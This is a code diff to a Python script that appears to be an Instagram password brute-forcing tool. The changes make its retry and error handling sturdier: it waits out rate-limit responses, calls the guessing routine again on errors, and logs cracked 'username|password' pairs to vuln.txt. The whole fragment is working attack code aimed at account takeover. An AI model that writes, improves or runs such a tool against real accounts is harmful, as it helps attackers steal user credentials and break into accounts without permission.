@@ -101,7 +101,7 @@ def pkwd():
                                   if 'Please wait a few minutes before you try again.' in js1:
                                       print("\033[00mPlease Waiting...\033[91m!!\033[00m")
                                       time.sleep(10)
-                                      os.system('python igbf.py')
+                                      pkwd()
                                   elif js1['authenticated'] == True:
                                        result+=1
                                        vuln.append(us+"|"+passw)
@@ -109,10 +109,13 @@ def pkwd():
                                        with open('vuln.txt','a') as x:
                                             x.write(us + '|' + passw + '\n')
                                             sys.exit('\033[00mPassword \033[92mFound\033[00m')
-                                            break
                                   else:
                                        print("\033[00m[\033[91mx\033[00m]"+us+ '|' +passw)
                               except KeyError:
+                                     print('\033[91mError!\033[00m')
+                                     time.sleep(5)
+                                     clear()
+                                     baner()
                                      pkwd()
                             
 def gpkwd():  
@@ -172,7 +175,9 @@ def gpkwd():
                                    print('\033[00m[\033[91mx\033[00m]'+us+ '|' +passw)
                        except KeyError:
                                print('\033[91mError!\033[00m')
-                               time.sleep(10)
+                               time.sleep(5)
+                               clear()
+                               baner()
                                gpkwd()
                        except requests.exceptions.ConnectionError:
                                sys.exit('\033[91mConnection Error\033[00m')
